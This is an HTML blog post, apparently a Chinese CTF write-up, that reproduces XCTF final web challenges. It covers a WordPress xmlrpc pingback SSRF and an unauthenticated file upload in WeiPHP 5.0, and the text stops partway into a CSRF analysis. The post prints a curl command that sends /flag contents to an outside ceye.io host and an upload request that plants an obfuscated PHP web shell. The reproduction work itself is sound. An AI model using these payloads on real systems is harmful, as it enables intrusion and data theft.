@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://imtinmin.github.io').hostname,
+    root: '/',
+    scheme: 'Muse',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="前言看ROIS发的final wp,真的tql">
+<meta name="keywords" content="WEB,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XCTF final WEB 复现">
+<meta property="og:url" content="http:&#x2F;&#x2F;imtinmin.github.io&#x2F;2020&#x2F;01&#x2F;17&#x2F;2020-1-17-WP&#x2F;index.html">
+<meta property="og:site_name" content="Imtinmin的小站">
+<meta property="og:description" content="前言看ROIS发的final wp,真的tql">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2019&#x2F;png&#x2F;669199&#x2F;1576767574130-9292bd10-13fd-4520-8da7-7d2122a67ef3.png#align=left&amp;display=inline&amp;height=312&amp;name=image.png&amp;originHeight=312&amp;originWidth=1381&amp;size=72622&amp;status=done&amp;style=none&amp;width=1381">
+<meta property="og:image" content="https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2019&#x2F;png&#x2F;669199&#x2F;1576767626137-63ce41f1-693a-4996-8bd4-caba790865fd.png#align=left&amp;display=inline&amp;height=689&amp;name=image.png&amp;originHeight=689&amp;originWidth=1255&amp;size=110344&amp;status=done&amp;style=none&amp;width=1255">
+<meta property="og:image" content="https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2019&#x2F;png&#x2F;669199&#x2F;1576767589837-83e0e3db-1a00-4215-83ca-e76415327884.png#align=left&amp;display=inline&amp;height=356&amp;name=image.png&amp;originHeight=356&amp;originWidth=1866&amp;size=65034&amp;status=done&amp;style=none&amp;width=1866">
+<meta property="og:image" content="https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2020&#x2F;png&#x2F;669199&#x2F;1579192202509-01d0dc8a-78b9-4327-97ef-18188799be8a.png#align=left&amp;display=inline&amp;height=394&amp;name=image.png&amp;originHeight=394&amp;originWidth=669&amp;size=51935&amp;status=done&amp;style=none&amp;width=669">
+<meta property="og:image" content="https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2020&#x2F;png&#x2F;669199&#x2F;1579227886325-f4976592-6a94-4269-8f29-d442cd81b0ce.png#align=left&amp;display=inline&amp;height=632&amp;name=image.png&amp;originHeight=632&amp;originWidth=824&amp;size=116575&amp;status=done&amp;style=none&amp;width=824">
+<meta property="og:image" content="https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2020&#x2F;png&#x2F;669199&#x2F;1579230066239-2e9e8013-f1e3-4924-a501-701ea2dadac7.png#align=left&amp;display=inline&amp;height=755&amp;name=image.png&amp;originHeight=755&amp;originWidth=1370&amp;size=114528&amp;status=done&amp;style=none&amp;width=1370">
+<meta property="og:image" content="https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2020&#x2F;png&#x2F;669199&#x2F;1579227825345-7b351db1-b287-4677-aeb7-679938f94030.png#align=left&amp;display=inline&amp;height=364&amp;name=image.png&amp;originHeight=364&amp;originWidth=1384&amp;size=62487&amp;status=done&amp;style=none&amp;width=1384">
+<meta property="og:image" content="https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2020&#x2F;png&#x2F;669199&#x2F;1579231277584-d1ef2e7c-67d2-41e5-aeba-27392eea9932.png#align=left&amp;display=inline&amp;height=575&amp;name=image.png&amp;originHeight=575&amp;originWidth=1189&amp;size=82293&amp;status=done&amp;style=none&amp;width=1189">
+<meta property="og:image" content="https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2020&#x2F;png&#x2F;669199&#x2F;1579258804629-92ecc638-203e-4f18-871c-fa57d39b6953.png#align=left&amp;display=inline&amp;height=454&amp;name=image.png&amp;originHeight=454&amp;originWidth=1329&amp;size=86511&amp;status=done&amp;style=none&amp;width=1329">
+<meta property="og:image" content="https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2020&#x2F;png&#x2F;669199&#x2F;1579262419262-e268c364-e113-4efb-97e6-9a3fc2f5242e.png#align=left&amp;display=inline&amp;height=864&amp;name=image.png&amp;originHeight=864&amp;originWidth=1504&amp;size=384476&amp;status=done&amp;style=none&amp;width=1504">
+<meta property="og:updated_time" content="2020-01-17T12:05:19.161Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2019&#x2F;png&#x2F;669199&#x2F;1576767574130-9292bd10-13fd-4520-8da7-7d2122a67ef3.png#align=left&amp;display=inline&amp;height=312&amp;name=image.png&amp;originHeight=312&amp;originWidth=1381&amp;size=72622&amp;status=done&amp;style=none&amp;width=1381">
+
+<link rel="canonical" href="http://imtinmin.github.io/2020/01/17/2020-1-17-WP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>XCTF final WEB 复现 | Imtinmin的小站</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Imtinmin的小站</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://imtinmin.github.io/2020/01/17/2020-1-17-WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Imtinmin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Imtinmin的小站">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XCTF final WEB 复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-01-17 20:01:41 / Modified: 20:05:19" itemprop="dateCreated datePublished" datetime="2020-01-17T20:01:41+08:00">2020-01-17</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看ROIS发的final wp,真的tql</p>
+<a id="more"></a>
+
+<h1 id="babypress"><a href="#babypress" class="headerlink" title="babypress"></a>babypress</h1><blockquote>
+<p>wordpress xmlrpc.php ssrf</p>
+</blockquote>
+<p><code>?rsd=1</code>  获取 <code>Host</code> <br /><img src="https://cdn.nlark.com/yuque/0/2019/png/669199/1576767574130-9292bd10-13fd-4520-8da7-7d2122a67ef3.png#align=left&display=inline&height=312&name=image.png&originHeight=312&originWidth=1381&size=72622&status=done&style=none&width=1381" alt="image.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /xmlrpc.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ctf.tinmin.cn:<span class="number">8000</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Ubuntu Chromium/<span class="number">78.0</span><span class="number">.3904</span><span class="number">.108</span> Chrome/<span class="number">78.0</span><span class="number">.3904</span><span class="number">.108</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 431</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;methodCall&gt; </span></span><br><span class="line"><span class="comment">  &lt;methodName&gt;pingback.ping&lt;/methodName&gt;</span></span><br><span class="line"><span class="comment">  &lt;params&gt;</span></span><br><span class="line"><span class="comment">    &lt;param&gt;</span></span><br><span class="line"><span class="comment">      &lt;value&gt;</span></span><br><span class="line"><span class="comment">        &lt;string&gt;http://backdoor:8080?backdoor=curl http://lekg1p.ceye.io/`cat /flag|base64`&lt;/string&gt;</span></span><br><span class="line"><span class="comment">      &lt;/value&gt;</span></span><br><span class="line"><span class="comment">    &lt;/param&gt;</span></span><br><span class="line"><span class="comment">    &lt;param&gt;</span></span><br><span class="line"><span class="comment">      &lt;value&gt;</span></span><br><span class="line"><span class="comment">        &lt;string&gt;http://Host/2019/11/08/hello-world/&lt;/string&gt;</span></span><br><span class="line"><span class="comment">      &lt;/value&gt;</span></span><br><span class="line"><span class="comment">    &lt;/param&gt;</span></span><br><span class="line"><span class="comment">  &lt;/params&gt;</span></span><br><span class="line"><span class="comment">&lt;/methodCall&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/669199/1576767626137-63ce41f1-693a-4996-8bd4-caba790865fd.png#align=left&display=inline&height=689&name=image.png&originHeight=689&originWidth=1255&size=110344&status=done&style=none&width=1255" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/669199/1576767589837-83e0e3db-1a00-4215-83ca-e76415327884.png#align=left&display=inline&height=356&name=image.png&originHeight=356&originWidth=1866&size=65034&status=done&style=none&width=1866" alt="image.png"></p>
+<h1 id="noxss"><a href="#noxss" class="headerlink" title="noxss"></a>noxss</h1><h2 id="下载最新的docker-compose"><a href="#下载最新的docker-compose" class="headerlink" title="下载最新的docker-compose"></a>下载最新的docker-compose</h2><p>curl -L <a href="https://github.com/docker/compose/releases/download/1.25.1-rc1/docker-compose-`uname" target="_blank" rel="noopener">https://github.com/docker/compose/releases/download/1.25.1-rc1/docker-compose-`uname</a> -s<code>-</code>uname -m` -o /usr/local/bin/docker-compose&gt; <br /><br>chmod +x /usr/local/bin/docker-compose</p>
+<h1 id="weiphp"><a href="#weiphp" class="headerlink" title="weiphp"></a>weiphp</h1><h2 id="Arbitrary-File-Upload"><a href="#Arbitrary-File-Upload" class="headerlink" title="Arbitrary File Upload"></a>Arbitrary File Upload</h2><p><br />command.php<br /></p>
+<blockquote>
+<p><strong>function *<em>upload_files($setting = *</em>‘’</strong>, $driver = <strong>‘’</strong>, $config = <strong>‘’</strong>, $type = <strong>‘picture’</strong>, $isTest = <strong>false</strong>)</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/669199/1579192202509-01d0dc8a-78b9-4327-97ef-18188799be8a.png#align=left&display=inline&height=394&name=image.png&originHeight=394&originWidth=669&size=51935&status=done&style=none&width=669" alt="image.png"></p>
+<p>在application搜这个函数有没被用到</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/669199/1579227886325-f4976592-6a94-4269-8f29-d442cd81b0ce.png#align=left&display=inline&height=632&name=image.png&originHeight=632&originWidth=824&size=116575&status=done&style=none&width=824" alt="image.png"></p>
+<p>先看<br />/home/model/FIle.php<br />/home/model/Picture.php<br /><br><br />都类似这样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($files, $setting, $driver = <span class="string">'Local'</span>, $config = null, $isTest = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/* 上传文件 */</span></span><br><span class="line">        $info = upload_files($setting, $driver, $config, <span class="string">'picture'</span>, $isTest);</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+
+<p><br />他们给File &amp; Picture模块写的方法，都有上传，<br /><br><br />先看一下这些模块方法又是怎么被调用的<br /><br><br />common.php里面有个 <code>D</code> 函数<br /></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">D</span><span class="params">($name = <span class="string">''</span>, $layer = <span class="string">'model'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 兼容大写的应用名的写法</span></span><br><span class="line">    <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">        <span class="keyword">list</span> ($module, $name) = explode(<span class="string">'/'</span>, $name, <span class="number">2</span>);</span><br><span class="line">        $module_name = parse_name($module);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// auto_make_model($name, $module_name);</span></span><br><span class="line"></span><br><span class="line">        $name = $module_name . <span class="string">'/'</span> . $name;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// auto_make_model($name);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> model($name, $layer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><br />model 函数在thinkphp\helper.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'model'</span>)) &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 实例化Model</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string    $name Model名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string    $layer 业务层名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bool      $appendSuffix 是否添加类名后缀</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \think\Model</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">model</span><span class="params">($name = <span class="string">''</span>, $layer = <span class="string">'model'</span>, $appendSuffix = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> app()-&gt;model($name, $layer, $appendSuffix);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><br />D用来返回模块<br /><br><br />D(‘home/File’) 就是使用home/model/File.php 这个模块文件<br />搜一下能在home/controller/File.php里的upload方法找到<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/669199/1579230066239-2e9e8013-f1e3-4924-a501-701ea2dadac7.png#align=left&display=inline&height=755&name=image.png&originHeight=755&originWidth=1370&size=114528&status=done&style=none&width=1370" alt="image.png"><br /><br><br /></p>
+<p>调用一下</p>
+<blockquote>
+<p>/home/file/upload</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/669199/1579227825345-7b351db1-b287-4677-aeb7-679938f94030.png#align=left&display=inline&height=364&name=image.png&originHeight=364&originWidth=1384&size=62487&status=done&style=none&width=1384" alt="image.png"></p>
+<p>需要登录</p>
+<p>还有一个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/669199/1579231277584-d1ef2e7c-67d2-41e5-aeba-27392eea9932.png#align=left&display=inline&height=575&name=image.png&originHeight=575&originWidth=1189&size=82293&status=done&style=none&width=1189" alt="image.png"></p>
+<p>不需要登录，直接传到根目录</p>
+<p>一直没懂上传表单的文件参数要是啥</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">isset</span>($info[<span class="string">'download'</span>][<span class="string">'msg'</span>]) &amp;&amp; <span class="keyword">empty</span>($info[<span class="string">'download'</span>][<span class="string">'msg'</span>])))</span><br></pre></td></tr></table></figure>
+
+<p>注意到这里 <code>$info[&#39;download&#39;]</code> ，$info是$return ,  $redata[$key] = $return，$key就是表单中上传文件的参数name，要想进入上传成功，$info[‘download’]要存在，所以表单中name=’download’</p>
+<p>poc:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/weiphp5.0/public/index.php/home/file/upload_root</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-CA,en-US;q=0.7,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------674495861235380143119652325</span><br><span class="line"><span class="attribute">Content-Length</span>: 422</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=r1kreb2kufmmtl8deukjs25g71</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------674495861235380143119652325</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="download"; filename="tinmin.php7"</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$a = "sy";</span><br><span class="line">$b = "stem";</span><br><span class="line">$c = $a.$b;</span><br><span class="line">$c($_POST['tinmin']);</span><br><span class="line"></span><br><span class="line">-----------------------------674495861235380143119652325</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="allow_file_ext"</span><br><span class="line"></span><br><span class="line"><span class="attribute">php7</span></span><br><span class="line"><span class="attribute">-----------------------------674495861235380143119652325--</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>application/common/controller/Base.php</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/669199/1579258804629-92ecc638-203e-4f18-871c-fa57d39b6953.png#align=left&display=inline&height=454&name=image.png&originHeight=454&originWidth=1329&size=86511&status=done&style=none&width=1329" alt="image.png"></p>
+<p>跟进 post_data<br />common.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以POST方式提交数据</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post_data</span><span class="params">($url, $param = [], $type = <span class="string">'json'</span>, $return_array = true, $useCert = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $has_json = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'json'</span> &amp;&amp; is_array($param)) &#123;</span><br><span class="line">        $has_json = <span class="keyword">true</span>;</span><br><span class="line">        $param = json_encode($param, JSON_UNESCAPED_UNICODE);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($type == <span class="string">'xml'</span> &amp;&amp; is_array($param)) &#123;</span><br><span class="line">        $param = ToXml($param);</span><br><span class="line">    &#125;</span><br><span class="line">    add_debug_log($url, <span class="string">'post_data'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化curl</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    <span class="keyword">if</span> ($type != <span class="string">'file'</span>) &#123;</span><br><span class="line">        add_debug_log($param, <span class="string">'post_data'</span>);</span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">30</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">180</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="keyword">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置header</span></span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'file'</span>) &#123;</span><br><span class="line">        $header[] = <span class="string">"content-type: multipart/form-data; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($type == <span class="string">'xml'</span>) &#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($has_json) &#123;</span><br><span class="line">        $header[] = <span class="string">"content-type: application/json; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">    